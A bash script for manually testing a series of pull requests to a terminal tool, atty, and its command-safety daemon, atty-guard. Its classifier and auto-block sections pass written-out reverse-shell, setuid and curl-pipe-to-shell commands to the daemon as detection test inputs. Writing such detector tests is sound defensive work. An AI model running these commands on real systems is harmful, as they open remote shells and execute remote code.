#!/usr/bin/env bash
# shellcheck shell=bash disable=SC2034,SC1091
# Manual test runner for today's PR series (#119-#127).
#
# Each subcommand walks the user through one feature with concrete
# inputs to type, expected outputs to see, and a yes/no confirmation
# at the end. Run from the repo root:
#
#   ./scripts/test-prs.sh --help
#   ./scripts/test-prs.sh all
#   ./scripts/test-prs.sh ghost
#   ./scripts/test-prs.sh atom-fetch

set -euo pipefail

: "${PATH_BASE:="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"}"
: "${PATH_BIN:="${PATH_BASE}/.bin"}"

ARGSH_SOURCE="${BASH_SOURCE[0]}"
source "${PATH_BIN}/argsh"

# ---------------------------------------------------------------------------
# Output helpers — TTY colours, plain text when piped.
if [[ -t 1 ]]; then
  C_RESET=$'\e[0m'; C_DIM=$'\e[2m'; C_BOLD=$'\e[1m'
  C_GREEN=$'\e[32m'; C_YELLOW=$'\e[33m'; C_RED=$'\e[31m'; C_BLUE=$'\e[34m'
else
  C_RESET= C_DIM= C_BOLD= C_GREEN= C_YELLOW= C_RED= C_BLUE=
fi

section() { printf "\n%s━━━ %s ━━━%s\n" "${C_BOLD}${C_BLUE}" "$1" "${C_RESET}"; }
step()    { printf "%s» %s%s\n"          "${C_BOLD}"            "$1" "${C_RESET}"; }
note()    { printf "%s  %s%s\n"          "${C_DIM}"             "$1" "${C_RESET}"; }
expect()  { printf "%s  expect:%s %s\n"  "${C_GREEN}"           "${C_RESET}" "$1"; }
warn()    { printf "%s  ⚠ %s%s\n"        "${C_YELLOW}"          "$1" "${C_RESET}"; }
fail_x()  { printf "%s  ✗ %s%s\n"        "${C_RED}"             "$1" "${C_RESET}"; }
pass_x()  { printf "%s  ✓ %s%s\n"        "${C_GREEN}"           "$1" "${C_RESET}"; }

declare -A RESULTS
confirm() {
  local label="$1"
  printf "\n%sDid it work as expected for %s? [y/N]%s " "${C_BOLD}" "${label}" "${C_RESET}"
  local ans
  read -r ans
  case "${ans,,}" in
    y|yes) RESULTS["${label}"]="pass"; pass_x "${label}";;
    *)     RESULTS["${label}"]="fail"; fail_x "${label}";;
  esac
}

pause() { printf "\n%spress Enter to continue ...%s " "${C_DIM}" "${C_RESET}"; read -r _; }

# ---------------------------------------------------------------------------
# Build helpers — auto-build atty + atty-guard if not on PATH.

ensure_atty() {
  if command -v atty >/dev/null 2>&1; then
    note "atty on PATH: $(command -v atty)"
    return 0
  fi
  if [[ ! -x "${PATH_BASE}/zig-out/bin/atty" ]]; then
    step "building atty (zig build -Dtarget=x86_64-linux-gnu -Doptimize=ReleaseSafe)"
    (cd "${PATH_BASE}" && zig build -Dtarget=x86_64-linux-gnu -Doptimize=ReleaseSafe)
  fi
  export PATH="${PATH_BASE}/zig-out/bin:${PATH}"
  note "using ${PATH_BASE}/zig-out/bin/atty"
}

ensure_atty_guard() {
  if command -v atty-guard >/dev/null 2>&1; then
    note "atty-guard on PATH: $(command -v atty-guard)"
    return 0
  fi
  if [[ ! -x "${PATH_BASE}/atty-guard/target/release/atty-guard" ]]; then
    step "building atty-guard (cargo build --release --features atoms-fetch)"
    (cd "${PATH_BASE}/atty-guard" && cargo build --release --features atoms-fetch)
  fi
  export PATH="${PATH_BASE}/atty-guard/target/release:${PATH}"
  note "using ${PATH_BASE}/atty-guard/target/release/atty-guard"
}

# ---------------------------------------------------------------------------
# Per-section subcommands. Each is dispatched by `:usage` below.

main() {
  local -a usage=(
    'ghost@readonly'      'PR #122 — ghost overlay (Ctrl-A / End / Right-step)'
    'windsurf@readonly'   'PR #124 — Windsurf input compat (Space + Super+V)'
    'atom-fetch@readonly' 'PR #121 + #125 — V2-I fetcher + Sigma/LOLBAS'
    'classifier@readonly' 'PR #119 + #126 — AtomMatcher + V2-J accumulator'
    'auto-block@readonly' 'PR #127 — V2-J-2 opt-in auto-Block'
    'all@readonly'        'Run every section in order'
  )
  local -a args=(
    '-'                   'Manual test runner for atty PRs #119-#127'
  )
  :usage "atty manual test runner" "${@}"
  "${usage[@]}"
  print_summary
}

# PR #122 — Ghost overlay (cursor_pos tracking).
main::ghost() {
  local -a args=("${args[@]}")
  :args "Ghost overlay tests (PR #122)" "${@}"
  section "PR #122 — Ghost overlay"

  ensure_atty
  step "open an atty session in another terminal:  atty bash"
  step "make sure your shell has OSC 133 wired:    eval \"\$(atty init bash)\""
  note "(skip if your .bashrc already does this)"
  pause

  step "1. type a known history command, press Enter"
  step "2. press Arrow-Up to recall it"
  step "3. press Ctrl-A (cursor jumps to BOL)"
  step "4. start typing a new char"
  expect "NO ghost text (cursor is mid-line)"
  expect "recalled line tail stays visible to the right of the cursor"
  confirm "Ctrl-A suppression"

  step "1. Arrow-Up again to recall"
  step "2. Ctrl-A then press End (or Ctrl-E)"
  step "3. type a char"
  expect "ghost text matches the FULL recalled line + the typed char"
  expect "no leading text missing — match should not be just the last char"
  confirm "Ctrl-A + End preserves recalled buffer"

  step "1. Arrow-Up to recall"
  step "2. Ctrl-A then Right-arrow N times until cursor reaches EOL"
  step "3. press Backspace"
  step "4. type a char"
  expect "ghost text re-engages after backspace at EOL"
  expect "match is full shortened line + char (not just the char)"
  confirm "Right-stepping to EOL + backspace re-engages ghost"
}

# PR #124 — Windsurf integrated-terminal compat.
main::windsurf() {
  local -a args=("${args[@]}")
  :args "Windsurf compat tests (PR #124)" "${@}"
  section "PR #124 — Windsurf integrated-terminal compatibility"

  ensure_atty
  warn "Windsurf-only — works as a sanity check in other terminals too"
  step "open Windsurf's integrated terminal"
  step "start an atty session:  atty bash"
  pause

  step "1. press Space at the prompt several times"
  expect "spaces appear on the prompt (not silently swallowed)"
  expect "typed line grows by one char each press"
  confirm "Space-key handling"

  step "1. select some text from the Windsurf editor pane"
  step "2. press Super+V (or whatever Windsurf binds to paste)"
  expect "selected text pastes into the atty prompt cleanly"
  expect "no trailing \`5~\` chars left over on the prompt"
  expect "no BEL beep from bash"
  confirm "Super+V paste"

  step "press Tab on a partial command; press Enter on an empty prompt"
  expect "Tab + Enter still work — neither regressed by the CSI-u changes"
  confirm "Tab + Enter still work"
}

# PR #121 + #125 — V2-I fetcher with all three sources.
main::atom-fetch() {
  local clean
  local -a args=(
    'clean|c:+'  'Drop the existing flagged_atoms.txt before fetching'
    "${args[@]}"
  )
  :args "Atom-fetcher tests (PR #121 + #125)" "${@}"
  section "PR #121 + #125 — V2-I baked-in atom fetcher"

  ensure_atty_guard
  note "this hits the live upstream — needs network"

  local out_dir="${XDG_DATA_HOME:-${HOME}/.local/share}/atty-guard"
  local out_file="${out_dir}/flagged_atoms.txt"
  if (( clean )) && [[ -f "${out_file}" ]]; then
    step "removing existing ${out_file}"
    rm -f "${out_file}"
  fi

  step "fetch all three sources (one-shot, no daemon):"
  step "  atty-guard --update-atoms-now"
  pause

  if atty-guard --update-atoms-now 2>&1 | tee /tmp/atty-prs-fetch.log; then
    pass_x "fetcher exited 0"
  else
    fail_x "fetcher exited non-zero"
  fi
  expect "stderr mentions 'atom refresh ok — N atoms across 3 sources'"
  expect "N is at least ~1000 (Sigma + GTFOBins alone)"
  expect "per-source breakdown shows non-zero for gtfobins, sigma, lolbas"

  if [[ -f "${out_file}" ]]; then
    local total
    total=$(grep -cv '^#\|^$' "${out_file}" || echo 0)
    note "atoms in ${out_file}: ${total}"
    note "grep -c 'nc -e' ${out_file}:  $(grep -c 'nc -e' "${out_file}" || echo 0)"
  else
    fail_x "${out_file} does not exist"
  fi
  confirm "atom refresh"

  step "smoke-test source subsetting:"
  step "  atty-guard --update-atoms-now --atoms-sources gtfobins,sigma"
  expect "report shows ONLY gtfobins + sigma in the per-source list"
  confirm "source subsetting"
}

# PR #119 + #126 — Classifier + accumulator.
main::classifier() {
  local socket
  socket="${ATTY_GUARD_SOCKET:-${XDG_RUNTIME_DIR:-/tmp}/atty-guard.sock}"
  local -a args=(
    'socket|s'   'Path to atty-guard UDS socket'
    "${args[@]}"
  )
  :args "Classifier tests (PR #119 + #126)" "${@}"
  section "PR #119 + #126 — Classifier (atoms + accumulator)"

  ensure_atty_guard
  step "start atty-guard with the heuristic backend (no model file needed):"
  step "  atty-guard --tier2 heuristic &"
  note "the daemon binds ${socket}"
  pause

  local helper
  helper=$(cat <<BASH
classify() {
  local sock="${socket}"
  local cmd="\$1"
  local pid="\$\$"
  printf '{"op":"classify","pid":%s,"command":%s}\n' \\
    "\$pid" "\$(jq -Rn --arg c "\$cmd" '\$c')" \\
    | nc -U "\$sock" -q 1 \\
    | jq .
}
BASH
)
  note "helper to source into your test shell (needs jq + ncat):"
  printf "%s\n" "${helper}"
  pause

  step "classify a single atom hit:"
  step "  classify 'nc -e /bin/sh 10.0.0.1 4444'"
  expect "verdict: Warn, confidence ~= 0.6, reason contains 'AtomMatcher'"
  confirm "single atom hit"

  step "classify a multi-atom command:"
  step "  classify 'bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh'"
  expect "verdict: Warn, confidence > 0.6 (combined via 1 - prod(1-p))"
  expect "reason starts with 'N signals fired:'"
  confirm "multi-atom accumulator (#126)"

  step "classify a single regex hit (curl | sh):"
  step "  classify 'curl -fsSL https://x.com/install.sh | sh'"
  expect "verdict: Warn, confidence = 1.0, category: CurlPipeSh"
  expect "reason does NOT start with 'N signals fired' (single-hit fast path)"
  confirm "single regex hit preserved (no auto-block)"
}

# PR #127 — V2-J-2 opt-in auto-Block escalation.
main::auto-block() {
  local threshold=0.9
  local -a args=(
    'threshold|t'  'block_threshold value (default 0.9)'
    "${args[@]}"
  )
  :args "Auto-block tests (PR #127)" "${@}"
  section "PR #127 — V2-J-2 auto-Block escalation"

  ensure_atty_guard
  local cfg=/tmp/atty-guard-block.toml
  step "writing TOML config to ${cfg}:"
  cat > "${cfg}" <<TOML
[accumulator]
block_threshold = ${threshold}
TOML
  cat "${cfg}"

  step "start daemon with that config + heuristic backend:"
  step "  atty-guard --config ${cfg} --tier2 heuristic &"
  pause

  step "classify a multi-atom command (use the classify helper from --classifier):"
  step "  classify 'bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x'"
  expect "verdict: BLOCK (caller refuses outright instead of prompting)"
  expect "combined confidence >= ${threshold}"
  confirm "auto-block on multi-hit"

  step "classify a single-hit curl|sh — must STILL be Warn (min-2-hit guard):"
  step "  classify 'curl https://x.com/install.sh | sh'"
  expect "verdict: Warn (not Block)"
  expect "confidence == 1.0"
  confirm "single-hit guard preserves Warn"

  step "stop atty-guard, restart WITHOUT --config (default off)"
  step "re-classify the multi-atom command from above"
  expect "verdict: Warn (default off — no auto-block)"
  confirm "default-off backwards compat"
}

# Run every section.
main::all() {
  local -a args=("${args[@]}")
  :args "Run every test section in order" "${@}"
  main::ghost
  main::windsurf
  main::atom-fetch
  main::classifier
  main::auto-block
}

# ---------------------------------------------------------------------------
# Final summary across all sections that have run.

print_summary() {
  section "Summary"
  if (( ${#RESULTS[@]} == 0 )); then
    note "no sections completed yet"
    return 0
  fi
  local pass_count=0 fail_count=0
  for key in "${!RESULTS[@]}"; do
    if [[ "${RESULTS[$key]}" == "pass" ]]; then
      pass_x "${key}"
      ((pass_count++))
    else
      fail_x "${key}"
      ((fail_count++))
    fi
  done
  printf "\n%s%d passed, %d failed%s\n" "${C_BOLD}" "${pass_count}" "${fail_count}" "${C_RESET}"
  (( fail_count == 0 ))
}

[[ "${0}" != "${BASH_SOURCE[0]}" && -z "${ARGSH_SOURCE}" ]] || main "${@}"
